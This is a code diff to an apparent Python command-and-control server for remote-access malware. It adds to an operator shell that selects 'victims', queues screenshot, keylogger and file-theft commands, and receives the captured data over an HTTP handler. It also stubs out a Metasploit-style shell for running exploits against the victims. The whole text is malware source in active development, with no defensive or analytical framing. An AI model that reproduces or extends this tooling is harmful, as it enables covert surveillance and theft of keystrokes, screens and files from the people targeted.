@@ -11,6 +11,7 @@ from Exceptions import SEQNumError, SEQSaveError
 import threading
 import cmd
 
+
 # Base Shell
 class BaseShell(cmd.Cmd):
     '''base'''
@@ -29,6 +30,11 @@ class BaseShell(cmd.Cmd):
 
         for data in log_data:
             print(data, end='')
+    
+    def _arg_parse(self, arg : str):
+        args = arg.split(' ')
+        
+        return args, len(args)
 
     def do_exit(self, arg):
         return True
@@ -68,7 +74,10 @@ class EntryShell(BaseShell):
         if arg and arg in self._get_victim_index():
             victim_shell = VictimShell()
             victim_shell.setTarget(arg, self._convert_victim_index_to_ip(arg))
-            victim_shell.cmdloop()
+            try:
+                victim_shell.cmdloop()
+            except KeyboardInterrupt:
+                return
 
     def do_show(self, arg):
         '''show victim'''
@@ -82,6 +91,7 @@ class EntryShell(BaseShell):
 class VictimShell(BaseShell):
 
     def setTarget(self, victimName, victimIP):
+        
         self.prompt = '{0}({1}) > '.format(victimName, victimIP)
         self.targetIP = victimIP
 
@@ -103,17 +113,39 @@ class VictimShell(BaseShell):
             print(list(victim_table[self.targetIP]['command']))
         pass
 
+    # screenshot, gf, keylogger를 get으로 통합하는 테스트 코드
+    """
     def do_get(self, arg):
+        '''get (screenshot|keylog|file)'''
         global victim_table
 
-        if arg == 'screenshot':
+        parsed_arg = self._arg_parse(arg)
+
+        if parsed_arg[0] == 'screenshot':
             victim_table[self.targetIP]['command'].append('[screenshot]')
             pass
-        elif arg == 'keylog':
+        elif parsed_arg[0] == 'keylog':
             victim_table[self.targetIP]['command'].append('[keylog]')
-        elif arg == 'file':
-            # TODO gf
-            pass
+        elif parsed_arg[0] == 'file':
+            if '\\' in parsed_arg[-1]:
+                parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]
+
+            if len(parsed_arg) == 2:
+                if path.isfile(FILE_PATH + parsed_arg[1]):
+                    print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
+                    return
+            elif len(parsed_arg) == 3:
+                if path.isfile(FILE_PATH + parsed_arg[2]):
+                    print('{} is already exit in FILE_PATH'.format(parsed_arg[2]))
+                    return
+            else:
+                return self.default('gf ' + arg)
+            
+            with open(FILE_PATH+parsed_arg[-1], 'wb'):
+                pass
+
+            victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
+    """
 
     def do_gf(self, arg):
         '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
@@ -146,6 +178,25 @@ class VictimShell(BaseShell):
     def do_sf(self, arg):
         '''미구현'''
         # TODO server to victim 파일 전송 구현하기
+        pass
+
+# 얻은 정보를 바탕으로 exploit을 검색하고 수행할 쉘
+class MetasploitShell(BaseShell):
+
+    # exploit search
+    def do_search(self, args):
+        pass
+    
+    # choose exploit
+    def do_use(self, args):
+        pass
+
+    # setting exploit option
+    def do_set(self, args):
+        pass
+
+    # run exploit
+    def do_exploit(self, args):
         pass
 
     
@@ -376,8 +427,8 @@ class CNCServer(BaseHTTPRequestHandler):
                     self._response_ftp_request("screenshot", victim_ip, datetime.now().strftime('%Y%m%d-%H%M%S.bmp'))
                     return
                 elif data == "[keylog]":
-                    self._response_ftp_request("keylog", victim_ip, "{}_keylog.txt".format(victim_ip))
-                    pass
+                    self._response_ftp_request("keylog", victim_ip, "{}_{}_keylog.txt".format(victim_ip,datetime.now().strftime('%Y%m%d-%H%M%S')))
+                    return
                 # gf 명령어 처리
                 elif data.startswith('[gf'):
                     file_name = data.split(' ')
@@ -451,7 +502,7 @@ FILE_PATH = './file/'
 TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 
 ENCODING = 'cp949'
-SERVER_INFO = ('172.17.244.119', 80)
+SERVER_INFO = ('127.0.0.1', 80)
 
 victim_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}
 victim_index = 0
